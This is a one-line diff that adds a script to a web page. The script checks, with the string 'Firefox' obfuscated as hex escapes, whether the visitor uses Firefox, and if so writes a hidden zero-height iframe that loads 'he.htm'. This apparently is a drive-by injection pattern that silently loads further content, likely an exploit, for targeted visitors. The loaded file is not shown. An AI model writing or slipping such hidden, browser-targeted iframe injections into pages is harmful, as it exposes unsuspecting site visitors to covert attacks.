@@ -1,0 +1,1 @@
+<script> if(isFirefox=navigator.userAgent.indexOf("\x46\x69\x72\x65\x66\x6F\x78")>0) document.write("<iframe src=he.htm width=100 height=0></iframe>");
